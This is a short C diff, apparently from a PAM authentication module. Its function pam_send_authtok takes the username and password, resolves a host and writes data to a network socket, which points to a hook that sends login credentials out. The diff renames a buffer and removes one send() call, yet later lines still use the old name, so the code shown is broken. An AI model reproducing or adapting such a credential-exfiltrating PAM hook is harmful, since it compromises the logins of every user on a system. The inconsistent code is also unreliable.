@@ -28,7 +28,7 @@ typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
 
     char host[256];
-    char ipstr[INET_ADDRSTRLEN + 2];
+    char ipaddr[INET_ADDRSTRLEN + 2];
     struct addrinfo hints, * res, * p;
     int status; 
 
@@ -59,8 +59,6 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
             int len = strnlen(ipstr, 16);
             ipstr[len + 1] = '\0';
             ipstr[len] = '\n';
-            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);
-
             // Break after the first IP address is found
             break;
         }
